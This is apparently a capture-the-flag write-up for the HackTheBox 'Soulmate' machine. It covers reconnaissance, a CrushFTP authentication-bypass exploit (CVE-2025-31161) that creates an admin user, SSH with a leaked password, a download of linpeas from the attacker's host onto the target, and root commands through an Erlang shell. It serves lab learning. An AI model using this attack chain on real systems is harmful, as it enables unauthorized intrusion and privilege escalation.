# The-Challenge-Soulmate-
The "Soulmate" machine from HackTheBox is a capture-the-flag challenge. The goal is to find and exploit security weaknesses in two distinct phases
Initial Access: To get a foothold on the machine as a low-privilege user (in this case, the user ben).

Privilege Escalation: To elevate your privileges from that user to the root (administrator) account, giving you full control.
### Step 1: Initial Reconnaissance & Subdomain Enumeration

Our first step was to identify open ports and services on the machine at 10.10.11.86 using `nmap`.

```bash
$ sudo nmap -sV -sC 10.10.11.86

Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org) ) at 2025-09-21 17:58 EEST
Nmap scan report for soulmate.htb (10.10.11.86)
Host is up (0.11s latency).
Not shown: 863 closed TCP ports (reset), 135 filtered TCP ports (no-response)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 1ubuntu1.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:d8:9d:49:4f (ECDSA)
|   256 64:ce:75:de:4a:e6:a5:84:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 97.57 seconds
The scan revealed two open ports:

22/tcp: OpenSSH

80/tcp: nginx web server

Before exploring the web server, I used ffuf to check for hidden subdomains.

Bash

# ffuf -u [http://10.10.11.86](http://10.10.11.86) -H "Host: FUZZ.soulmate.htb" -w /path/to/wordlist.txt -fw 4

:: Method           : GET
:: URL              : [http://10.10.11.86](http://10.10.11.86)
:: Wordlist         : FUZZ: /path/to/wordlist.txt
:: Header           : Host: FUZZ.soulmate.htb
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
:: Filter           : Response words: 4
This scan didn't immediately yield results. I added the main domain to my /etc/hosts file.

Bash

$ echo "10.10.11.86 soulmate.htb" | sudo tee -a /etc/hosts
Based on the machine name and common patterns, I tested the ftp.soulmate.htb subdomain and added it to /etc/hosts as well.

Bash

# echo "10.10.11.86 ftp.soulmate.htb" | sudo tee -a /etc/hosts
This was correct. Visiting http://ftp.soulmate.htb presented a login page for CrushFTP.

Step 2: Initial Access via CrushFTP Vulnerability
I examined the page's source code and found the software version: 11.w.657.

HTML

<script src="/WebInterface/new-ui/assets/app/components/loader2.js?v=11.W.657-2025_03_08_07_52"></script>
A search revealed this version is vulnerable to CVE-2025-31161, a critical authentication bypass that allows creating a new administrative user. I used an exploit script to create a new admin account.

Bash

# python3 exploit.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user test --password test123

[+] Preparing Payloads
[-] Warming up the target
[-] Target is up and running
[+] Sending Account Create Request
[+] User created successfully
[+] Exploit Complete you can now login with
[*] Username: test
[*] Password: test123
With the test:test123 credentials, I logged into the admin panel.

Inside the User Manager, I found an existing user named ben and was able to view his password.

Step 3: Gaining a User Shell
With the discovered password for ben, I attempted to connect via SSH on port 22.

Username: ben

Password: HouseHoldings998

Bash

$ ssh ben@10.10.11.86
ben@10.10.11.86's password:
Last login: Sun Sep 21 16:59:56 2025 from 10.10.14.71
ben@soulmate:~$
The connection was successful. I had a user shell and could read user.txt.

Step 4: Privilege Escalation to Root
The final step was to escalate privileges to root. The sudo command failed as expected.

Bash

ben@soulmate:~$ sudo su
[sudo] password for ben:
ben is not in the sudoers file. This incident will be reported.
I downloaded linpeas.sh to the target machine for enumeration.

Bash

# On attacker machine
$ python3 -m http.server 8000

# On target machine
ben@soulmate:/dev/shm$ wget [http://10.10.14.71:8000/linpeas.sh](http://10.10.14.71:8000/linpeas.sh) -O lin.sh
ben@soulmate:/dev/shm$ chmod +x lin.sh
ben@soulmate:/dev/shm$ ./lin.sh
LinPEAS revealed an interesting finding: an Erlang SSH service running on port 2222.

Since I already had valid credentials for ben, I tried to SSH into this service on localhost.

Bash

ben@soulmate:~$ ssh ben@localhost -p 2222
ben@localhost's password:
Eshell V15.2.5 (press Ctrl+G to abort, type help() for help)
(ssh_runner@soulmate)1>
This connected me to an Erlang shell. After some research, I found that the os:cmd/1 function can be used to execute system commands.

I verified my privileges by running id:

Erlang

(ssh_runner@soulmate)1> io:format("~s~n", [os:cmd("id")])
uid=0(root) gid=0(root) groups=0(root)
ok
I was root. I then read the final flag:

Erlang

(ssh_runner@soulmate)2> io:format("~s~n", [os:cmd("cat /root/root.txt")])
22b9d6466c3c0cde72f862dc5cdc6b0e
ok
(ssh_runner@soulmate)3>

---

## 📋 Extracted Text from All Images

As requested, here is the raw text extracted from all the embedded images in the PDF.

<details>
  <summary>Click to view all extracted text</summary>

  <h4>Page 1: Nmap Scan</h4>
  <pre>
(user@parrot)-[~]
$ sudo nmap -sV -sC 10.10.11.86
Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org) ) at 2025-09-21 17:58 EEST
Nmap scan report for soulmate.htb (10.10.11.86)
Host is up (0.11s latency).
Not shown: 863 closed tcp ports (reset), 135 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 1ubuntu1.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:d8:9d:49:4f (ECDSA)
|   256 64:ce:75:de:4a:e6:a5:84:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 97.57 seconds
user@parrot-[~]
$
  </pre>

  <h4>Page 2: ffuf Scan</h4>
  <pre>
[root@parrot]-[/home/codix]
# ffuf -u [http://10.10.11.86](http://10.10.11.86) -H "Host: FUZZ.soulmate.htb" -w /home/codix/Desktop/subdomains-top1million-5000.txt -fw 4

        /'__ \            /'__ \       /'__ \
       /\ \ \ \          /\ \ \ \     /\ \ \ \
       \ \ \ \ \         \ \ \ \ \    \ \ \ \ \
        \ \ \ \ \____     \ \ \ \ \    \ \ \ \ \
         \ \ \ \ \__ \     \ \ \ \ \    \ \ \ \ \
          \ \ \ \ \ \ \     \ \ \ \ \    \ \ \ \ \
           \ \ \ \ \ \ \     \ \ \ \ \    \ \ \ \ \
            \ \ \ \_\ \ \  __ \ \ \ \ \ __ \ \ \ \ \
             \ \ \____/ / /__\ \ \ \ \ /__\ \ \ \ \
              \ /_____/  \____/\ \_\ \ \____/\ \_\ \
                               \/_/ /_/      \/_/ /_/
       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : [http://10.10.11.86](http://10.10.11.86)
 :: Wordlist         : FUZZ: /home/codix/Desktop/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________
  </pre>

  <h4>Page 4: Python Exploit</h4>
  <pre>
[root@parrot]-[/home/codix/Desktop]
# python3 exploit.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user test --password test123
[+] Preparing Payloads
[-] Warming up the target
[-] Target is up and running
[+] Sending Account Create Request
[+] User created successfully
[+] Exploit Complete you can now login with
[*] Username: test
[*] Password: test123
  </pre>

  <h4>Page 6: wget linpeas.sh</h4>
  <pre>
www-data@soulmate:/dev/shm$ wget [http://10.10.14.71:8000/linpeas.sh](http://10.10.14.71:8000/linpeas.sh) -O lin.sh
--2025-09-21 16:49:32--  [http://10.10.14.71:8000/linpeas.sh](http://10.10.14.71:8000/linpeas.sh)
Connecting to 10.10.14.71:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 961834 (939K) [text/x-sh]
Saving to: 'lin.sh'

lin.sh                100%[===================>] 939.29K   333KB/s    in 2.8s

2025-09-21 16:49:35 (333 KB/s) - 'lin.sh' saved [961834/961834]
www-data@soulmate:/dev/shm$
  </pre>

  <h4>Page 7: Erlang Config Snippet</h4>
  <pre>
{auth_methods, "publickey, password"},
{user_passwords, [{"ben", "HouseHoldings998"}]},
{idle_time, infinity},
{max_channels, 10},
{max_sessions, 10},
{parallel_login, true}
]}
of
(ok, _Pid) ->
  io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n
(error, Reason) ->
  io:format("Failed to start SSH daemon: ~p~n", [Reason])
end,
  </pre>

  <h4>Page 7: Erlang Shell (Root)</h4>
  <pre>
(ssh_runner@soulmate)1> io:format("~s~n", [os:cmd("id")])
uid=0(root) gid=0(root) groups=0(root)
ok
(ssh_runner@soulmate)2> io:format("~s~n", [os:cmd("cat /root/root.txt")])
22b9d6466c3c0cde72f862dc5cdc6b0e
ok
(ssh_runner@soulmate)3>
  </pre>
</details>

---
